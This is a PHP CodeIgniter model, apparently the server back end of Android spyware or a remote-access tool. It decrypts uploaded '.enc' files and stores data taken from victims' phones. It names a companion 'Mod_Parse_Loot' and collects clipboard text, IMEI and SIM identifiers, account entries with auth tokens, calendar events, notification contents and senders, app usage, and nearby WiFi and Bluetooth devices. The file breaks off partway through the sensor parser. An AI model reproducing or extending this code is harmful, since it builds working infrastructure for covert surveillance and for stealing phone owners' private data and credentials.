<?php

namespace App\Models;

use CodeIgniter\Model;

/**
 * Mod_Parse_Advanced
 *
 * Handles decryption and DB ingestion for all 8 Advanced Data Extractors:
 *   1. DeviceContextExtractor  → tbl_device_hardware_contexts
 *   2. NetworkInfoExtractor    → tbl_system_network_info + tbl_telemetry_wifi_networks_nearby
 *   3. AccountsExtractor       → tbl_accounts
 *   4. CalendarExtractor       → tbl_extracted_calendar_events
 *   5. AppUsageExtractor       → tbl_system_app_usage + tbl_system_app_usage_sessions
 *   6. NotificationExtractor   → tbl_extracted_notifications
 *   7. BluetoothExtractor      → tbl_telemetry_bluetooth_devices + tbl_telemetry_bluetooth_devices_paired
 *   8. SensorProfileExtractor  → tbl_telemetry_sensors
 *
 * All methods follow the same pattern as Mod_Parse_Loot:
 *   - Read encrypted file from WRITEPATH/uploads/text_dump/
 *   - Decrypt via Mod_Crypt::decode_content() (AES-128-CBC)
 *   - Parse JSON and batch-insert, skipping duplicates
 */
class Mod_Parse_Advanced extends Model
{
    /**
     * DeviceContextExtractor
     * File prefix: device_context_TIMESTAMP.enc
     */
    public function parse_device_context(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $battery      = $json['battery']  ?? [];
            $locale       = $json['locale']   ?? [];
            $extracted_at = $json['extracted_at'] ?? null;

            $data = [
                'owner_id'                   => $owner_id,
                'device_id'                  => $device_id,
                // Battery
                'battery_level_percent'      => $json['battery_level']       ?? $battery['level_percent']        ?? null,
                'battery_is_charging'        => isset($json['battery_is_charging']) ? ($json['battery_is_charging'] ? 1 : 0) : (isset($battery['is_charging']) ? ($battery['is_charging'] ? 1 : 0) : null),
                'battery_plugged_usb'        => isset($json['battery_plugged_usb']) ? ($json['battery_plugged_usb'] ? 1 : 0) : (isset($battery['plugged_usb']) ? ($battery['plugged_usb'] ? 1 : 0) : null),
                'battery_plugged_ac'         => isset($json['battery_plugged_ac'])  ? ($json['battery_plugged_ac'] ? 1 : 0)  : (isset($battery['plugged_ac'])  ? ($battery['plugged_ac'] ? 1 : 0)  : null),
                'battery_temperature_celsius'=> $json['battery_temp']          ?? $battery['temperature_celsius']  ?? null,
                'battery_voltage_mv'         => $json['battery_voltage']       ?? $battery['voltage_mv']           ?? null,
                'battery_health'             => $json['battery_health']        ?? $battery['health']               ?? null,
                // Clipboard
                'clipboard_text'             => $json['clipboard_content']     ?? $json['clipboard_text']          ?? $json['clip_text'] ?? null,
                // Locale
                'locale_country'             => $json['device_country']        ?? $locale['country']               ?? null,
                'locale_display_country'     => $locale['display_country']       ?? null,
                'locale_language'            => $json['device_language']       ?? $locale['language']              ?? null,
                'locale_display_language'    => $locale['display_language']      ?? null,
                'locale_timezone'            => $json['device_timezone']       ?? $locale['timezone']              ?? null,
                'locale_timezone_offset_ms'  => $json['device_timezone_offset'] ?? $locale['timezone_offset_ms']   ?? null,
                // Metadata
                'extracted_at'               => $extracted_at,
                'created_at'                 => $dated,
                'updated_at'                 => $dated,
            ];

            $this->db->table('tbl_device_hardware_contexts')->insert($data);
            log_message('info', '[parse_device_context] Inserted 1 row from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_device_context] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * NetworkInfoExtractor
     * File prefix: network_info_TIMESTAMP.enc
     */
    public function parse_network_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $wifi         = $json['current_wifi'] ?? [];
            $cellular     = $json['cellular'] ?? [];
            $extracted_at = $json['extracted_at'] ?? null;

            $mainData = [
                'owner_id'               => $owner_id,
                'device_id'              => $device_id,
                'is_connected'           => isset($json['is_connected'])  ? ($json['is_connected'] ? 1 : 0) : null,
                'connection_type'        => $json['connection_type']       ?? null,
                'is_roaming'             => isset($json['is_roaming'])    ? ($json['is_roaming'] ? 1 : 0) : null,
                'network_operator_name'  => $json['network_operator_name'] ?? null,
                'network_country_iso'    => $json['network_country_iso']   ?? null,
                'sim_operator_name'      => $json['sim_operator_name']     ?? null,
                'sim_country_iso'        => $json['sim_country_iso']       ?? null,
                'sim_state'              => $json['sim_state']             ?? null,
                'phone_type'             => $json['phone_type']            ?? null,
                'device_imei'            => $json['device_imei']           ?? null,
                'sim_serial'             => $json['sim_serial']            ?? null,
                'subscriber_id'          => $json['subscriber_id']         ?? null,
                // Current WiFi (flattened)
                'wifi_ssid'              => $wifi['ssid']        ?? null,
                'wifi_bssid'             => $wifi['bssid']       ?? null,
                'wifi_link_speed'        => $wifi['link_speed']  ?? null,
                'wifi_frequency'         => $wifi['frequency']   ?? null,
                'wifi_rssi'              => $wifi['rssi']        ?? null,
                'wifi_link_speed_mbps'   => $wifi['wifi_link_speed_mbps'] ?? $wifi['link_speed'] ?? null,
                'wifi_frequency_mhz'     => $wifi['wifi_frequency_mhz'] ?? $wifi['frequency'] ?? null,
                'wifi_channel'           => $wifi['wifi_channel'] ?? null,
                'wifi_channel_width'     => $wifi['wifi_channel_width'] ?? null,
                'wifi_noise'             => $wifi['wifi_noise'] ?? null,
                'wifi_snr'               => $wifi['wifi_snr'] ?? null,
                'wifi_standard'          => $wifi['wifi_standard'] ?? null,
                'wifi_phy_mode'          => $wifi['wifi_phy_mode'] ?? null,
                'wifi_tx_rate'           => $wifi['wifi_tx_rate'] ?? null,
                'wifi_rx_rate'           => $wifi['wifi_rx_rate'] ?? null,
                'wifi_retry_rate'        => $wifi['wifi_retry_rate'] ?? null,
                'wifi_lost_packet_rate'  => $wifi['wifi_lost_packet_rate'] ?? null,
                'cell_identity'          => json_encode($json['cell_identity'] ?? []),
                'data_network_type'      => $json['data_network_type'] ?? null,
                'is_5g_nsa'              => isset($cellular['is_5g_nsa']) ? ($cellular['is_5g_nsa'] ? 1 : 0) : 0,
                'is_5g_sa'               => isset($cellular['is_5g_sa']) ? ($cellular['is_5g_sa'] ? 1 : 0) : 0,
                'nr_ssb_frequency'       => $cellular['nr_ssb_frequency'] ?? null,
                'nr_scs'                 => $cellular['nr_scs'] ?? null,
                'nr_band'                => $cellular['nr_band'] ?? null,
                'wifi_mac_address'       => $wifi['mac_address'] ?? null,
                'wifi_ip_address'        => $wifi['ip_address']  ?? null,
                'extracted_at'           => $extracted_at,
                'created_at'             => $dated,
                'updated_at'             => $dated,
            ];

            $this->db->table('tbl_system_network_info')->insert($mainData);
            $networkInfoId = $this->db->insertID();

            // Nearby WiFi child rows
            $nearbyList = $json['network_list'] ?? $json['nearby_wifi'] ?? [];
            if (!empty($nearbyList) && is_array($nearbyList) && $networkInfoId > 0) {
                $nearbyBatch = [];
                foreach ($nearbyList as $ap) {
                    $nearbyBatch[] = [
                        'network_info_id' => $networkInfoId,
                        'owner_id'        => $owner_id,
                        'ssid'            => $ap['ssid']         ?? null,
                        'bssid'           => $ap['bssid']        ?? null,
                        'capabilities'    => $ap['capabilities'] ?? null,
                        'level'           => $ap['level']        ?? null,
                        'frequency'       => $ap['frequency']    ?? null,
                        'created_at'      => $dated,
                    ];
                }
                if (!empty($nearbyBatch)) {
                    $this->db->table('tbl_telemetry_wifi_networks_nearby')->insertBatch($nearbyBatch);
                }
            }

            log_message('info', '[parse_network_info] Inserted network snapshot + ' . count($nearbyList) . ' nearby APs from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_network_info] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * AccountsExtractor
     * File prefix: accounts_TIMESTAMP.enc
     */
    public function parse_accounts(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;
            if ($json === null || !isset($json['accounts_list']) || !is_array($json['accounts_list'])) {
                log_message('error', '[parse_accounts] Invalid JSON or missing accounts_list: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $total_count  = $json['total_count']  ?? count($json['accounts_list']);
            $summary_json = isset($json['summary']) ? json_encode($json['summary']) : null;
            $authenticator_types_json = isset($json['authenticator_types']) ? json_encode($json['authenticator_types']) : null;

            $batchData = [];
            $seenKeys  = [];
            foreach ($json['accounts_list'] as $account) {
                $accountName = $account['name'] ?? null;
                $accountType = $account['type'] ?? null;

                if (!$accountName && !$accountType) {
                    continue;
                }

                // Batch duplicate check
                $key = $accountName . '|' . $accountType;
                if (in_array($key, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_accounts')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('account_name', $accountName)
                    ->where('account_type', $accountType)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $key;
                    $batchData[] = [
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'account_name' => $accountName,
                        'account_type'               => $accountType,
                        'account_label'              => $account['account_label'] ?? null,
                        'is_syncable'                => isset($account['is_syncable']) ? ($account['is_syncable'] ? 1 : 0) : 0,
                        'sync_auto'                  => isset($account['sync_auto']) ? ($account['sync_auto'] ? 1 : 0) : 0,
                        'sync_interval'              => $account['sync_interval'] ?? 0,
                        'last_sync_time'             => $account['last_sync_time'] ?? null,
                        'last_sync_result'           => $account['last_sync_result'] ?? 0,
                        'last_sync_error'            => $account['last_sync_error'] ?? null,
                        'user_data'                  => json_encode($account['user_data'] ?? []),
                        'auth_token_type'            => $account['auth_token_type'] ?? null,
                        'features'                   => json_encode($account['features'] ?? []),
                        'icon_base64'                => $account['icon_base64'] ?? null,
                        'small_icon_base64'          => $account['small_icon_base64'] ?? null,
                        'authenticator_description'  => json_encode($account['authenticator_description'] ?? []),
                        'custom_auth_token'          => $account['custom_auth_token'] ?? null,
                        'grant_kerberos_token'       => isset($account['grant_kerberos_token']) ? ($account['grant_kerberos_token'] ? 1 : 0) : 0,
                        'summary_json' => $summary_json,
                        'total_count'  => $total_count,
                        'authenticator_types' => $authenticator_types_json,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                        'updated_at'   => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_accounts')->insertBatch($batchData);
            }

            log_message('info', '[parse_accounts] Inserted ' . count($batchData) . ' account rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_accounts] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * CalendarExtractor
     * File prefix: calendar_TIMESTAMP.enc
     */
    public function parse_calendar(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;
            $calendarList = $json['calendar_list'] ?? $json['events'] ?? null;
            if ($calendarList === null || !is_array($calendarList)) {
                log_message('error', '[parse_calendar] Invalid JSON or missing calendar_list/events: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $batchData = [];
            $seenKeys  = [];

            foreach ($calendarList as $event) {
                $eventId = $event['id'] ?? null;
                if (!$eventId) continue;

                // Batch duplicate check
                if (in_array($eventId, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_extracted_calendar_events')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('event_id', $eventId)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $eventId;
                    $batchData[] = [
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'event_id'     => $eventId,
                        'title'        => $event['title']       ?? null,
                        'description'  => $event['description'] ?? null,
                        'location'     => $event['location']    ?? null,
                        'start_time'   => $event['start_time']  ?? null,
                        'end_time'     => $event['end_time']    ?? null,
                        'duration'     => $event['duration']    ?? null,
                        'all_day'      => isset($event['all_day']) ? ($event['all_day'] ? 1 : 0) : 0,
                        'original_all_day' => isset($event['original_all_day']) ? ($event['original_all_day'] ? 1 : 0) : 0,
                        'original_instance_time' => $event['original_instance_time'] ?? null,
                        'organizer'    => $event['organizer']   ?? null,
                        'timezone'     => $event['timezone']    ?? null,
                        'uid'          => $event['uid']         ?? null,
                        'rrule'        => $event['rrule']       ?? null,
                        'rdate'        => $event['rdate']       ?? null,
                        'exdate'       => $event['exdate']      ?? null,
                        'exrule'       => $event['exrule']      ?? null,
                        'access_level' => $event['access_level'] ?? null,
                        'calendar_id'  => $event['calendar_id'] ?? null,
                        'calendar_name'=> $event['calendar_name'] ?? null,
                        'calendar_color' => $event['calendar_color'] ?? null,
                        'calendar_access_level' => $event['calendar_access_level'] ?? null,
                        'owner_account'=> $event['owner_account'] ?? null,
                        'event_status' => $event['event_status'] ?? null,
                        'visibility'   => $event['visibility'] ?? null,
                        'transparency' => $event['transparency'] ?? null,
                        'availability' => $event['availability'] ?? null,
                        'has_alarm'    => isset($event['has_alarm']) ? ($event['has_alarm'] ? 1 : 0) : 0,
                        'has_attendee_data' => isset($event['has_attendee_data']) ? ($event['has_attendee_data'] ? 1 : 0) : 0,
                        'has_extended_properties' => isset($event['has_extended_properties']) ? ($event['has_extended_properties'] ? 1 : 0) : 0,
                        'can_invite_others' => isset($event['can_invite_others']) ? ($event['can_invite_others'] ? 1 : 0) : 0,
                        'last_synced'  => $event['last_synced'] ?? null,
                        'event_color'  => $event['event_color'] ?? null,
                        'is_obsolete'  => isset($event['is_obsolete']) ? ($event['is_obsolete'] ? 1 : 0) : 0,
                        'self_attendee_status' => $event['self_attendee_status'] ?? null,
                        'last_date'    => $event['last_date'] ?? null,
                        'original_sync_id' => $event['original_sync_id'] ?? null,
                        'custom_app_package' => $event['custom_app_package'] ?? null,
                        'custom_app_uri' => $event['custom_app_uri'] ?? null,
                        'deleted'      => isset($event['deleted']) ? ($event['deleted'] ? 1 : 0) : 0,
                        'dirty'        => isset($event['dirty']) ? ($event['dirty'] ? 1 : 0) : 0,
                        'attendees_json' => isset($event['attendees']) ? json_encode($event['attendees']) : null,
                        'reminders_json' => isset($event['reminders']) ? json_encode($event['reminders']) : null,
                        'extended_properties_json' => isset($event['extended_properties']) ? json_encode($event['extended_properties']) : null,
                        'extracted_at' => $extracted_at,
                        'created_at'   => $dated,
                        'updated_at'   => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_extracted_calendar_events')->insertBatch($batchData);
            }

            log_message('info', '[parse_calendar] Inserted ' . count($batchData) . ' calendar events from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_calendar] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * AppUsageExtractor
     * File prefix: app_usage_TIMESTAMP.enc
     */
    public function parse_app_usage(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            // Flexible detection of the data array
            $usageRows = null;
            if (isset($json['usage_list']) && is_array($json['usage_list'])) {
                $usageRows = $json['usage_list'];
            } elseif (isset($json['app_usage']) && is_array($json['app_usage'])) {
                $usageRows = $json['app_usage'];
            } elseif (isset($json['usage']) && is_array($json['usage'])) {
                $usageRows = $json['usage'];
            } elseif (is_array($json) && (isset($json[0]) || empty($json))) {
                $usageRows = $json;
            }

            if ($usageRows === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_app_usage] Could not find usage data array in file: ' . $file_name);
                return false;
            }

            // Composite injects both 'timestamp' and 'extracted_at' from the same
            // extraction run; the extractor's own extracted_at (device ms) wins when present.
            // Server clock is only a last-resort fallback for legacy files.
            $extracted_at = $json['extracted_at'] ?? $json['timestamp'] ?? time() * 1000;
            $seenPackages = [];
            $inserted = 0;
            $skipped = 0;

            foreach ($usageRows as $app) {
                // Flexible package key detection
                $packageName = $app['package_name'] ?? $app['package'] ?? $app['name'] ?? null;
                if (!$packageName) {
                    $skipped++;
                    continue;
                }

                // Batch duplicate check
                if (in_array($packageName, $seenPackages)) {
                    $skipped++;
                    continue;
                }

                // Upsert logic: skip if identical snapshot already stored
                $exists = $this->db->table('tbl_system_app_usage')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('package_name', $packageName)
                    ->where('extracted_at', $extracted_at)
                    ->countAllResults() > 0;

                if ($exists) {
                    $skipped++;
                    continue;
                }

                $seenPackages[] = $packageName;

                $appData = [
                    'owner_id'              => $owner_id,
                    'device_id'             => $device_id,
                    'package_name'          => $packageName,
                    'app_name'              => $app['app_name']             ?? null,
                    'foreground_time_ms'    => $app['foreground_time_ms']   ?? $app['foreground_ms'] ?? $app['totalTimeInForeground'] ?? $app['total_time_in_foreground'] ?? $app['app_usage_time'] ?? $app['usage_time'] ?? $app['totalTimeVisible'] ?? $app['total_time_visible'] ?? $app['totalTime'] ?? $app['total_time'] ?? 0,
                    'foreground_time_hours' => $app['foreground_time_hours'] ?? $app['foreground_hours'] ?? 0,
                    'last_time_used'        => $app['last_time_used']       ?? $app['last_used'] ?? null,
                    'is_system_app'         => isset($app['is_system_app']) ? ($app['is_system_app'] ? 1 : 0) : 0,
                    'background_time_ms'    => $app['background_time_ms']    ?? 0,
                    'interactive_time_ms'   => $app['interactive_time_ms']   ?? $app['foreground_time_ms'] ?? null,
                    'screen_on_time_ms'     => $app['screen_on_time_ms']     ?? null,
                    'keyguard_shown_time_ms'=> $app['keyguard_shown_time_ms']?? 0,
                    'session_count'         => $app['session_count']         ?? 0,
                    'session_durations_json' => json_encode($app['session_durations'] ?? []),
                    'first_launch_of_day'  => $app['first_launch_of_day']   ?? null,
                    'last_launch_of_day'   => $app['last_launch_of_day']    ?? null,
                    'longest_session_ms'   => $app['longest_session_ms']    ?? null,
                    'shortest_session_ms'  => $app['shortest_session_ms']   ?? null,
                    'avg_session_ms'       => $app['avg_session_ms']        ?? null,
                    'distinct_days_used'   => $app['distinct_days_used']    ?? null,
                    'usage_by_hour_json'   => json_encode($app['usage_by_hour'] ?? []),
                    'usage_by_dow_json'    => json_encode($app['usage_by_dow'] ?? []),
                    'notification_seen_count' => $app['notification_seen_count'] ?? null,
                    'notification_clicked_count' => $app['notification_clicked_count'] ?? null,
                    'app_standby_bucket'   => $app['app_standby_bucket']    ?? null,
                    'app_standby_reason'   => $app['app_standby_reason']    ?? null,
                    'times_opened'         => $app['times_opened']          ?? null,
                    'time_taken_formatted' => $app['time_taken_formatted']  ?? null,
                    'extracted_at'          => $extracted_at,
                    'created_at'            => $dated,
                    'updated_at'            => $dated,
                ];

                $this->db->table('tbl_system_app_usage')->insert($appData);
                $usageId = $this->db->insertID();
                $inserted++;

                // Insert session events from sessions_list or session_durations
                if (!empty($app['session_durations']) && is_array($app['session_durations']) && $usageId > 0) {
                    $sessBatch = [];
                    foreach ($app['session_durations'] as $sd) {
                        $sessBatch[] = [
                            'app_usage_id' => $usageId,
                            'owner_id'     => $owner_id,
                            'event_type'   => 'session_duration',
                            'timestamp'    => null,
                            'session_start_ms' => $sd['start'] ?? null,
                            'session_end_ms'   => $sd['end'] ?? null,
                            'session_duration_ms' => $sd['duration_ms'] ?? null,
                            'created_at'   => $dated,
                        ];
                    }
                    if (!empty($sessBatch)) {
                        $this->db->table('tbl_system_app_usage_sessions')->insertBatch($sessBatch);
                    }
                }
            }

            log_message('info', '[parse_app_usage] Processed ' . count($usageRows) . " apps from $file_name (Inserted: $inserted, Skipped: $skipped)");
            return true;


        } catch (\Exception $e) {
            log_message('error', '[parse_app_usage] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * NotificationExtractor
     * File prefix: notifications_TIMESTAMP.enc
     * NOTE: The payload is a raw JSON *array*, not an object.
     */
    public function parse_notifications(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $jsonParsed = $this->payloadToArray($payload, $file_name);
            if ($jsonParsed === null) return false;
            $extractedAt = $jsonParsed['extracted_at'] ?? $jsonParsed['timestamp'] ?? null;
            $notifications = null;
            
            if (isset($jsonParsed['notifications_list']) && is_array($jsonParsed['notifications_list'])) {
                $notifications = $jsonParsed['notifications_list'];
            } else {
                $notifications = $jsonParsed;
            }

            if ($notifications === null || !is_array($notifications)) {
                log_message('error', '[Mod_Parse_Advanced::parse_notifications] Invalid JSON (expected array or notifications_list): ' . $file_name);
                return false;
            }

            $batchData = [];
            $seenKeys  = [];
            foreach ($notifications as $notif) {
                if (!is_array($notif)) {
                    continue;
                }
                $notifId    = $notif['id']        ?? null;
                $notifTs    = $notif['timestamp'] ?? null;
                $action     = $notif['action']    ?? null;

                // Unique key for notifications: ID + Timestamp + Action
                $key = "{$notifId}|{$notifTs}|{$action}";
                if (in_array($key, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_extracted_notifications')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('notification_id', $notifId)
                    ->where('notification_timestamp', $notifTs)
                    ->where('action', $action)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $key;
                    $batchData[] = [
                        'owner_id'               => $owner_id,
                        'device_id'              => $device_id,
                        'notification_id'        => $notifId,
                        'package_name'           => $notif['package']
                            ?? $notif['packageName']
                            ?? $notif['package_name']
                            ?? null,
                        'app_name'               => $notif['app_name'] ?? null,
                        'title'                  => $notif['raw_title'] ?? $notif['title']    ?? null,
                        'text'                   => $notif['raw_body']  ?? $notif['text']     ?? $notif['body'] ?? null,
                        'sender'                 => $notif['sender'] ?? $notif['sender_name'] ?? $notif['from'] ?? null,
                        'sub_text'               => $notif['sub_text'] ?? $notif['subText'] ?? null,
                        'channel_id'             => $notif['channel_id'] ?? null,
                        'channel_name'           => $notif['channel_name'] ?? null,
                        'channel_importance'     => $notif['channel_importance'] ?? 0,
                        'group_key'              => $notif['group_key'] ?? null,
                        'sort_key'               => $notif['sort_key'] ?? null,
                        'is_ongoing'             => isset($notif['is_ongoing']) ? ($notif['is_ongoing'] ? 1 : 0) : 0,
                        'is_local_only'          => isset($notif['is_local_only']) ? ($notif['is_local_only'] ? 1 : 0) : 0,
                        'color'                  => $notif['color'] ?? null,
                        'badge_icon'             => $notif['badge_icon'] ?? null,
                        'large_icon_base64'      => $notif['large_icon_base64'] ?? null,
                        'actions'                => json_encode($notif['actions'] ?? []),
                        'remote_input_history'   => json_encode($notif['remote_input_history'] ?? []),
                        'people'                 => json_encode($notif['people'] ?? []),
                        'shortcut_id'            => $notif['shortcut_id'] ?? null,
                        'locus_id'               => $notif['locus_id'] ?? null,
                        'bubble_metadata'        => $notif['bubble_metadata'] ?? null,
                        'settings_text'          => $notif['settings_text'] ?? null,
                        'timeout_after'          => $notif['timeout_after'] ?? null,
                        'flags'                  => $notif['flags'] ?? 0,
                        'suppressed_visual_effects' => $notif['suppressed_visual_effects'] ?? 0,
                        'category'               => $notif['category'] ?? $notif['channel'] ?? $notif['channel_id'] ?? null,
                        'visibility'             => $notif['visibility'] ?? null,
                        'is_screen_notification' => self::resolveScreenNotificationFlag($notif),
                        'notification_timestamp' => $notifTs,
                        'action'                 => $action,
                        'extracted_at'           => $extractedAt,
                        'created_at'             => $dated,
                        'updated_at'             => $dated,
                    ];
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_extracted_notifications')->insertBatch($batchData);
            }

            log_message('info', '[parse_notifications] Inserted ' . count($batchData) . ' notification rows from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_notifications] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * BluetoothExtractor
     * File prefix: bluetooth_TIMESTAMP.enc
     */
    public function parse_bluetooth(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            $extracted_at = $json['extracted_at'] ?? null;

            $btData = [
                'owner_id'        => $owner_id,
                'device_id'       => $device_id,
                'is_enabled'      => isset($json['is_enabled']) ? ($json['is_enabled'] ? 1 : 0) : null,
                'adapter_name'    => $json['adapter_name']    ?? null,
                'adapter_address' => $json['adapter_address'] ?? null,
                'paired_count'    => $json['paired_count']    ?? 0,
                'extracted_at'    => $extracted_at,
                'created_at'      => $dated,
                'updated_at'      => $dated,
            ];

            $this->db->table('tbl_telemetry_bluetooth_devices')->insert($btData);
            $bluetoothId = $this->db->insertID();

            // Paired devices child rows
            $btList = $json['bluetooth_list'] ?? $json['paired_devices'] ?? [];
            if (!empty($btList) && is_array($btList) && $bluetoothId > 0) {
                $pairedBatch = [];
                foreach ($btList as $dev) {
                    $pairedBatch[] = [
                        'bluetooth_id' => $bluetoothId,
                        'owner_id'     => $owner_id,
                        'bt_name'      => $dev['name']       ?? null,
                        'bt_address'   => $dev['address']    ?? null,
                        'bt_type'      => $dev['type']       ?? null,
                        'bond_state'   => $dev['bond_state'] ?? null,
                        'alias'                  => $dev['alias']      ?? null,
                        'device_class'           => $dev['device_class'] ?? null,
                        'device_class_major'     => $dev['device_class_major'] ?? null,
                        'device_class_minor'     => $dev['device_class_minor'] ?? null,
                        'rssi'                   => $dev['rssi'] ?? 0,
                        'tx_power'               => $dev['tx_power'] ?? null,
                        'appearance'             => $dev['appearance'] ?? null,
                        'uuids'                  => json_encode($dev['uuids'] ?? []),
                        'manufacturer_data'      => $dev['manufacturer_data'] ?? null,
                        'service_data'           => $dev['service_data'] ?? null,
                        'address_type'           => $dev['address_type'] ?? null,
                        'bond_state'             => $dev['bond_state'] ?? null,
                        'bonding_attempt'        => isset($dev['bonding_attempt']) ? ($dev['bonding_attempt'] ? 1 : 0) : 0,
                        'is_le'                  => isset($dev['is_le']) ? ($dev['is_le'] ? 1 : 0) : 0,
                        'le_address'             => $dev['le_address'] ?? null,
                        'le_address_type'        => $dev['le_address_type'] ?? null,
                        'connection_state'       => $dev['connection_state'] ?? 0,
                        'connection_interval_ms'  => $dev['connection_interval_ms'] ?? null,
                        'connection_latency'     => $dev['connection_latency'] ?? null,
                        'supervision_timeout_ms' => $dev['supervision_timeout_ms'] ?? null,
                        'mtu'                    => $dev['mtu'] ?? null,
                        'bt_phy'                 => $dev['phy'] ?? null,
                        'phy_tx'                 => $dev['phy_tx'] ?? null,
                        'phy_rx'                 => $dev['phy_rx'] ?? null,
                        'data_length'            => $dev['data_length'] ?? null,
                        'att_mtu'                => $dev['att_mtu'] ?? null,
                        'bond_order'             => $dev['bond_order'] ?? 0,
                        'last_seen_time'         => $dev['last_seen_time'] ?? null,
                        'last_connected_time'    => $dev['last_connected_time'] ?? null,
                        'connection_count'       => $dev['connection_count'] ?? 0,
                        'total_bytes_sent'       => $dev['total_bytes_sent'] ?? 0,
                        'total_bytes_received'   => $dev['total_bytes_received'] ?? 0,
                        'created_at'   => $dated,
                    ];
                }
                if (!empty($pairedBatch)) {
                    $this->db->table('tbl_telemetry_bluetooth_devices_paired')->insertBatch($pairedBatch);
                }
            }

            log_message('info', '[parse_bluetooth] Inserted BT snapshot + ' . count($btList) . ' paired devices from ' . $file_name);
            return true;

        } catch (\Exception $e) {
            log_message('error', '[parse_bluetooth] Exception: ' . $e->getMessage());
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────

    /**
     * SensorProfileExtractor
     * File prefix: sensors_TIMESTAMP.enc
     */
    public function parse_sensors(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
    {
        try {
            $file_name = is_string($payload) ? $payload : '(inline)';
            $dated = date('Y-m-d H:i:s');

            $json = $this->payloadToArray($payload, $file_name);
            if ($json === null) return false;

            // Flexible detection of the data array
            $sensorRows = null;
            if (isset($json['sensors']) && is_array($json['sensors'])) {
                $sensorRows = $json['sensors'];
            } elseif (isset($json['sensors_list']) && is_array($json['sensors_list'])) {
                $sensorRows = $json['sensors_list'];
            } elseif (is_array($json) && (isset($json[0]) || empty($json))) {
                $sensorRows = $json;
            }

            if ($sensorRows === null) {
                log_message('error', '[Mod_Parse_Advanced::parse_sensors] Could not find sensor data array in file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $batchData    = [];
            $seenKeys     = [];

            foreach ($sensorRows as $sensor) {
                $typeId = $sensor['type_id'] ?? null;
                if ($typeId === null) continue;

                // Batch duplicate check
                if (in_array($typeId, $seenKeys)) {
                    continue;
                }

                // Database duplicate check
                $exists = $this->db->table('tbl_telemetry_sensors')
                    ->where('owner_id', $owner_id)
                    ->where('device_id', $device_id)
                    ->where('type_id', $typeId)
                    ->where('extracted_at', $extracted_at)
                    ->countAllResults() > 0;

                if (!$exists) {
                    $seenKeys[] = $typeId;
                    $batchData[] = [
                        'owner_id'     => $owner_id,
                        'device_id'    => $device_id,
                        'sensor_name'  => $sensor['name']          ?? null,
                        'vendor'       => $sensor['vendor']        ?? null,
                        'type_id'      => $typeId,
                        'type_string'  => $sensor['type_string']   ?? null,
                        'version'      => $sensor['version']       ?? null,
